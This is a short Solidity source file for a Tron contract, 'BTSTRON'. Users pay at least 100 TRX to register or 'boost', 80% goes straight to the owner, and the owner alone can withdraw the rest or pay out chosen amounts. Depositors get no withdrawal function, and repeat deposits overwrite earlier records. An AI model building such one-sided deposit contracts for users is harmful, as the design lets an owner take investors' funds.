//SourceUnit: tron.sol

pragma solidity ^0.5.10;

contract BTSTRON  {
    address payable owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner,"You are not authorized.");
        _;
    }
    
    constructor(address payable _owner) public {
        owner = _owner;
    }

    struct User{
        uint256 tokenAmount;
        uint256 boostingAmount;
    }

    mapping(address => User) public Users;

    function() payable external {}
    
    function getTokenAmount(address _owner) public view returns (uint256) {
        return Users[_owner].tokenAmount;
    }
    
    function getBoostingAmount(address _owner) public view returns (uint256) {
        return Users[_owner].boostingAmount;
    }

    function register() external payable{
        require(msg.value >= 100e6,"Select amount first");
        Users[msg.sender].tokenAmount = msg.value;
        owner.transfer(msg.value * 80 / 100);
    }
    
    function boosting() external payable{
        require(msg.value >= 100e6,"Select amount first");
        Users[msg.sender].boostingAmount = msg.value;
        owner.transfer(msg.value * 80 / 100);
    }

    function swap(uint256 amount) external onlyOwner {
        owner.transfer(amount);
    }
    
    function sendToAllTRX(address payable[]  memory  _contributors, uint256[] memory _balances) public payable onlyOwner {
       
        uint256 i = 0; 
        for (i; i < _contributors.length; i++) {         
          
            _contributors[i].transfer(_balances[i]);
        }
    }
}